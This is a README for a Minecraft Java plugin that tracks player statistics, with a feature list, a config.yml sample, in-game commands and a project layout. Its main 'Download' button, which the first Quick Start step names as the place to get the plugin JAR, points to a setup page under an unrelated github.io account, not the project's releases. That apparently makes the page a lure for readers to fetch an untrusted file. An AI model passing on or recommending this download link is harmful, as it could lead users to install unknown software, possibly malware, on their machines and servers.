# Minecraft‑Player‑Statistics‑Tracker  

**Author:** *TigerProxy78*  
**Version:** `v1.0.0` • **License:** MIT  

---  

## 📊 What is this?

A lightweight, **configurable** Java plugin that captures every nuance of a player’s in‑game activity. From block placements and mob kills to latency spikes, the tracker logs data in real‑time and produces **actionable performance reports** you can browse from within Minecraft or export to CSV/JSON for deeper analysis.

---

## 🚀 Quick Start

| | |
|---|---|
| <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download-Release%20Page-4CAF50?style=for-the-badge&logo=github" alt="Download"></a> | <a href="https://github.com/TigerProxy78/Minecraft-Player-Statistics-Tracker/releases"><img src="https://img.shields.io/github/v/release/TigerProxy78/Minecraft-Player-Statistics-Tracker?style=for-the-badge&color=orange" alt="Latest Release"></a> |
| <a href="https://github.com/TigerProxy78/Minecraft-Player-Statistics-Tracker/wiki/Installation"><img src="https://img.shields.io/badge/Docs-Installation-007ACC?style=for-the-badge&logo=readthedocs" alt="Installation Docs"></a> | <a href="https://github.com/TigerProxy78/Minecraft-Player-Statistics-Tracker/issues"><img src="https://img.shields.io/github/issues/TigerProxy78/Minecraft-Player-Statistics-Tracker?style=for-the-badge&color=red" alt="Issues"></a> |

1. **Download** the latest JAR from the button above.  
2. Drop it into your server’s `plugins/` folder.  
3. Restart or reload the server.  
4. Edit `config.yml` (see *Configuration* below) and enjoy instant analytics.

---

## 🛠️ Core Features

| Feature | Description |
|---|---|
| **Real‑time analytics** | Streams player actions to an in‑memory cache, updating dashboards every second. |
| **Configurable granularity** | Choose which events to record (block break, chat, movement, etc.) to balance detail vs. performance. |
| **Performance reports** | Auto‑generated PDFs & HTML summaries per player, per session, or server‑wide. |
| **Export options** | CSV, JSON, or MySQL dump for external BI utility. |
| **Live scoreboard integration** | Hook into the built‑in scoreboard to display live stats (e.g., *Kills Today*, *Blocks Placed*). |
| **Permission‑aware** | Fine‑grained control via LuckPerms or native Bukkit permissions. |
| **Extensible API** | Other plugins can subscribe to the `PlayerStatEvent` bus. |

---

## ⚙️ Configuration (config.yml)

```yaml
# -------------------------------------------------
# Minecraft Player Statistics Tracker – Config
# -------------------------------------------------
tracking:
  enabled: true
  events:
    block_break: true
    block_place: true
    mob_kill: true
    player_kill: true
    chat: false
    movement: false
    latency: true

storage:
  type: sqlite        # options: sqlite, mysql, json
  mysql:
    host: localhost
    port: 3306
    database: mc_stats
    user: root
    password: secret

reporting:
  auto_generate: true
  interval_minutes: 60
  formats: [pdf, html, csv]

dashboard:
  enabled: true
  update_rate_ticks: 20   # 1 second
  display:
    - kills_today
    - blocks_placed
    - avg_ping
```

*Tip:* After any change, run `/mst reload` to apply without a full server restart.

---

## 📂 Project Layout

```
src/
 └─ main/
     ├─ java/com/tigerproxy78/mst/
     │   ├─ Main.java                ← plugin entry point
     │   ├─ tracker/                  ← event listeners & cache
     │   ├─ storage/                  ← SQLite/MySQL adapters
     │   └─ report/                   ← PDF/HTML generators
     └─ resources/
         └─ config.yml                ← default config
```

---

## 🎮 In‑Game Commands

| Command | Permission | Description |
|---|---|---|
| `/mst reload` | `mst.admin` | Reload the configuration. |
| `/mst stats <player>` | `mst.view` | Show a quick summary of a player’s stats. |
| `/mst report <player> [type]` | `mst.report` | Generate an on‑demand report (type = pdf|html|csv). |
| `/mst toggle <event>` | `mst.admin` | Enable/disable a specific tracking event at runtime. |

All commands provide tab‑completion and contextual help.

---

## 📈 Sample Dashboard

![Dashboard Screenshot](https://raw.githubusercontent.com/TigerProxy78/Minecraft-Player-Statistics-Tracker/main/assets/dashboard.png)

*Live scoreboard showing kills, blocks placed, and average latency per player.*

---

## 🤝 Contributing

1. Fork the repo.  
2. Create a feature branch (`git checkout -b feat/your‑feature`).  
3. Follow the existing code style (Google Java Format).  
4. Submit a Pull Request with a clear description and screenshots if UI changes are involved.

Please read the **CONTRIBUTING.md** for detailed guidelines.

---

## 🐞 Bug Reporting & Support

- Open an issue on GitHub with steps to reproduce.  
- Include your server version, plugin version, and relevant log excerpts.  
- For quick questions, join the **#minecraft‑stats** channel on our Discord (link in the Wiki).

---

## 📜 License

Distributed under the **MIT License**. See `LICENSE` for full text.

---  

*Crafted with ❤️ for the Minecraft community.*